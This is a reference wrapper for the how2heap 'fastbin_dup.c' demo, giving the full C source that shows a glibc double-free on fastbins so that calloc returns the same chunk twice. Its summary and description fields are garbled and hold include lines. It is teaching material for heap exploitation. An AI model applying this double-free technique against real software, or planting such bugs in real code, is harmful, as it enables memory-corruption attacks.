---
title: "Fastbin Dup (how2heap)"
category: "pwn"
subcategory: "heap"
type: "script"
tags: ["how2heap", "fastbin-dup.c", "tcache", "fastbin", "dup", "fastbin-dup", "pwn"]
summary: "include <stdio.h> include <stdlib.h> include <assert.h>"
tools: ["how2heap"]
source:
  name: "shellphish/how2heap"
  url: "https://github.com/shellphish/how2heap/blob/02da6aa26a44/glibc_2.31/fastbin_dup.c"
license: "MIT"
---

## What it does

include <stdio.h> include <stdlib.h> include <assert.h>

## Where it lives

- Vendored locally at `vendor/how2heap/glibc_2.31/fastbin_dup.c`
- Upstream: <https://github.com/shellphish/how2heap/blob/02da6aa26a44/glibc_2.31/fastbin_dup.c>

## Usage

```bash
# read or run it straight from the vendored copy
$EDITOR vendor/how2heap/glibc_2.31/fastbin_dup.c
gcc -g -o /tmp/fastbin_dup vendor/how2heap/glibc_2.31/fastbin_dup.c && /tmp/fastbin_dup
```

## Code

```c
#include <stdio.h>
#include <stdlib.h>
#include <assert.h>

int main()
{
	setbuf(stdout, NULL);

	printf("This file demonstrates a simple double-free attack with fastbins.\n");

	printf("Fill up tcache first.\n");
	void *ptrs[8];
	for (int i=0; i<8; i++) {
		ptrs[i] = malloc(8);
	}
	for (int i=0; i<7; i++) {
		free(ptrs[i]);
	}

	printf("Allocating 3 buffers.\n");
	int *a = calloc(1, 8);
	int *b = calloc(1, 8);
	int *c = calloc(1, 8);

	printf("1st calloc(1, 8): %p\n", a);
	printf("2nd calloc(1, 8): %p\n", b);
	printf("3rd calloc(1, 8): %p\n", c);

	printf("Freeing the first one...\n");
	free(a);

	printf("If we free %p again, things will crash because %p is at the top of the free list.\n", a, a);
	// free(a);

	printf("So, instead, we'll free %p.\n", b);
	free(b);

	printf("Now, we can free %p again, since it's not the head of the free list.\n", a);
	free(a);

	printf("Now the free list has [ %p, %p, %p ]. If we malloc 3 times, we'll get %p twice!\n", a, b, a, a);
	a = calloc(1, 8);
	b = calloc(1, 8);
	c = calloc(1, 8);
	printf("1st calloc(1, 8): %p\n", a);
	printf("2nd calloc(1, 8): %p\n", b);
	printf("3rd calloc(1, 8): %p\n", c);

	assert(a == c);
}

```

## Attribution

- **Author:** Shellphish
- **Repository:** <https://github.com/shellphish/how2heap> (commit `02da6aa26a44`)
- **Licence:** MIT — see `vendor/how2heap/LICENSE`

This file is a wrapper for search and reference. The code is the original authors' work, redistributed unmodified under its own licence.
